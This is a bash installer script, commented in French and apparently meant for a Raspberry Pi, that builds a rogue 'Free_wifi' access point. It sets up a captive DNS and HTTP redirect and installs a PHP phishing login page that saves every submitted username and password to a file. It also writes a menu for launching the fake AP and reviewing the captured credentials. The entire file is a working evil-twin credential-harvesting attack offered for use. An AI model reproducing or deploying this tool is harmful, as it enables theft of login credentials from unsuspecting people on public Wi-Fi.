#!/bin/bash

# üîß Variables
DIR="/home/pi/pineapple"
WWW="$DIR/www"
CAPTURE="$DIR/captures"
INTERFACE_AP="wlan1"
GATEWAY="10.0.0.1"

echo "[*] Mise √† jour et installation des d√©pendances..."
sudo apt update
sudo apt install -y hostapd dnsmasq lighttpd php

echo "[*] Cr√©ation de l'arborescence..."
mkdir -p "$WWW" "$CAPTURE"

echo "[*] Configuration du syst√®me pour √©viter les conflits DHCP..."

# Emp√™che dhcpcd de g√©rer wlan1
if ! grep -q "denyinterfaces $INTERFACE_AP" /etc/dhcpcd.conf; then
    echo "denyinterfaces $INTERFACE_AP" | sudo tee -a /etc/dhcpcd.conf
    sudo systemctl restart dhcpcd
fi

# D√©sactive dnsmasq syst√®me (√©vite conflit sur port 67)
sudo systemctl stop dnsmasq 2>/dev/null
sudo systemctl disable dnsmasq 2>/dev/null

echo "[*] G√©n√©ration de la page de phishing..."
cat > "$WWW/index.php" << 'EOF'
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $login = $_POST["login"];
    $password = $_POST["password"];
    file_put_contents("/home/pi/pineapple/captures/creds.txt", date("Y-m-d H:i:s") . " - $login : $password\n", FILE_APPEND);
    header("Location: https://google.com");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Free Wi-Fi</title>
</head>
<body>
    <h2>Connexion Free_wifi</h2>
    <form method="POST">
        Login : <input type="text" name="login" /><br />
        Mot de passe : <input type="password" name="password" /><br />
        <input type="submit" value="Connexion" />
    </form>
</body>
</html>
EOF

echo "[*] G√©n√©ration de hostapd.conf..."
cat > "$DIR/hostapd.conf" <<EOF
interface=$INTERFACE_AP
driver=nl80211
ssid=Free_wifi
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
EOF

echo "[*] G√©n√©ration de dnsmasq.conf..."
cat > "$DIR/dnsmasq.conf" <<EOF
interface=$INTERFACE_AP
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.50,12h
address=/#/10.0.0.1
EOF

echo "[*] Cr√©ation du menu interactif Pineapple..."
cat > "$DIR/pineapple_menu.sh" << 'EOF'
#!/bin/bash

WLAN_FAKEAP="wlan1"
GATEWAY="10.0.0.1"
DIR="/home/pi/pineapple"
CAPTURE_FILE="$DIR/captures/creds.txt"

start_pineapple() {
    echo "[*] D√©marrage du fake AP sur $WLAN_FAKEAP..."
    sudo ip link set "$WLAN_FAKEAP" down
    sudo iw dev "$WLAN_FAKEAP" set type __ap
    sudo ip addr flush dev "$WLAN_FAKEAP"
    sudo ip addr add "$GATEWAY/24" dev "$WLAN_FAKEAP"
    sudo ip link set "$WLAN_FAKEAP" up
    sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
    sudo iptables -F
    sudo iptables -t nat -F
    sudo iptables -t nat -A PREROUTING -i "$WLAN_FAKEAP" -p tcp --dport 80 -j DNAT --to "$GATEWAY":80
    sudo iptables -t nat -A POSTROUTING -j MASQUERADE
    sudo dnsmasq -C "$DIR/dnsmasq.conf"
    sudo hostapd "$DIR/hostapd.conf" &
    sudo cp -r "$DIR/www" /var/www/html/
    sudo systemctl restart lighttpd
    echo "[‚úî] Pineapple lanc√©. SSID : Free_wifi"
    read -p "Appuie sur Entr√©e pour revenir au menu..."
}

stop_pineapple() {
    echo "[*] Arr√™t du Pineapple..."
    sudo killall hostapd dnsmasq 2>/dev/null
    sudo iptables -F
    sudo iptables -t nat -F
    sudo ip addr flush dev "$WLAN_FAKEAP"
    sudo ip link set "$WLAN_FAKEAP" down
    sudo iw dev "$WLAN_FAKEAP" set type managed
    sudo ip link set "$WLAN_FAKEAP" up
    echo "[‚úî] Pineapple arr√™t√©."
    read -p "Appuie sur Entr√©e pour revenir au menu..."
}

show_creds() {
    echo -e "\n[üìÑ] Identifiants captur√©s :"
    if [[ -f "$CAPTURE_FILE" ]]; then
        cat "$CAPTURE_FILE"
    else
        echo "Aucun identifiant trouv√©."
    fi
    echo
    read -p "Appuie sur Entr√©e pour revenir au menu..."
}

clear_creds() {
    if [[ -f "$CAPTURE_FILE" ]]; then
        > "$CAPTURE_FILE"
        echo "[‚úî] Identifiants effac√©s."
    else
        echo "Aucun fichier √† vider."
    fi
    read -p "Appuie sur Entr√©e pour revenir au menu..."
}

while true; do
    clear
    echo "============================="
    echo "   üçç MENU PINEAPPLE RPi"
    echo "============================="
    echo "1. D√©marrer le Pineapple"
    echo "2. Arr√™ter le Pineapple"
    echo "3. Voir les identifiants captur√©s"
    echo "4. Vider les identifiants"
    echo "5. Quitter"
    echo "-----------------------------"
    read -p "Choix [1-5] : " choice

    case "$choice" in
        1) start_pineapple ;;
        2) stop_pineapple ;;
        3) show_creds ;;
        4) clear_creds ;;
        5) echo "√Ä bient√¥t !"; exit 0 ;;
        *) echo "Option invalide."; sleep 1 ;;
    esac
done
EOF

chmod +x "$DIR/pineapple_menu.sh"

echo "[‚úî] Installation termin√©e !"
echo "‚û°Ô∏è Lance le menu avec : bash $DIR/pineapple_menu.sh"